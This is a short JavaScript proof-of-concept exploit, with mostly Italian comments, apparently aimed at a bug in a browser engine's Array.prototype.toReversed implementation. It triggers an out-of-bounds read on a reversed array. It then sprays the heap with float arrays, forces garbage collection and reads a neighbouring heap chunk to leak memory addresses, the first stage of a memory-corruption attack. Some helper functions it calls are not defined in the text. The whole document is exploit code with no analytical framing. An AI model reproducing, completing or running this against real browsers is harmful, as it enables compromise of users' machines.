const v1 = [-1n]; // create a JSArray 
let v2;

// Controllo se .toReversed() esiste
if (Array.prototype.toReversed) {
    alert("Usando toReversed() per v1");
    v2 = v1.toReversed(); // call arrayProtoFuncToReversed
} else {
    alert("toReversed() non esiste! Usando reverse() per v1");
    v2 = [...v1].reverse(); // Alternativa se toReversed non è disponibile
}

alert(describe(v2));
sleepSeconds(5); // pause execution
alert(v2[2]?.print()); // access randomly a field of v2[2]

// 2 Leaking addresses
function gc() {
    new Uint8Array(4 * 1024 * 1024);
}

let spray_arr = new Array(0x20);
for (let i = 0; i < 0x40; i++) {
   spray_arr[i] = [2.1*i, 2.2, 2.3]; // spray some arrays
}
gc(); // clean memory and force allocation reusing above’s heap 

let b1 = [1.1];

if (Array.prototype.toReversed) {
    alert("Usando toReversed() per b1");
    b1 = b1.toReversed();
} else {
    alert("toReversed() non esiste! Usando reverse() per b1");
    b1 = [...b1].reverse();
}

let addr1 = f2i(b1[1]); // b1[1] is previous heap chunk and will be leaked
alert("leak1: " + hex(addr1));
